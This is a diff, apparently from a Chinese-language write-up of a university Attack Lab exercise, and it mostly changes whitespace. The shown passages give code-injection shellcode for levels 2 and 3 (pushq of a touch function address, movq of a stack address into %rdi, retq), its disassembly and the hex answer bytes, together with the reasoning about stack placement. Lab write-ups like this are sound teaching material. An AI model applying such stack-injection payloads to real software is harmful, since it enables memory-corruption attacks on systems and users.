@@ -57,7 +57,7 @@ $2 = 0x5561dc78
 File\:phase.s   
 ```assembly
 pushq $0x4017ec
-movq $0x59b997fa,%rdi
+movq  $0x59b997fa,%rdi
 retq
 
 ```
@@ -81,26 +81,26 @@ c3
 
 
 ### ***CI level3***
-和level2的思路一致 先获取touch3地址 0x4018fa
-level3需要将cookie转换成ascii字符串形式
-0x59b997fa 转化为字符串为 35 39 62 39 39 37 66 61
-同时 提示给出 touch3中会导致输入被覆盖 
-因此 传递的参数不能直接储存至输入 于是在栈指针下方储存
-rsp + 0x8 = 0x5561dca8 
+和level2的思路一致 先获取touch3地址 0x4018fa  
+level3需要将cookie转换成ascii字符串形式   
+0x59b997fa 转化为字符串为 35 39 62 39 39 37 66 61   
+同时 提示给出 touch3中会导致输入被覆盖    
+因此 传递的参数不能直接储存至输入 于是在栈指针下方储存   
+rsp + 0x8 = 0x5561dca8    
 phase3.s:
 ```assembly
 pushq $0x4018fa
-movq $0x5561dca8,%rdi
+movq  $0x5561dca8,%rdi
 retq
 
 ```
-反汇编得到
+反汇编得到   
 ```
 fa 18 40 00       	      pushq  $0x4018fa
 5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
 c:	c3                   	retq   
 ```
-答案
+答案   
 ```
 68 fa 18 40 00
 48 c7 c7 a8 dc 61 55 
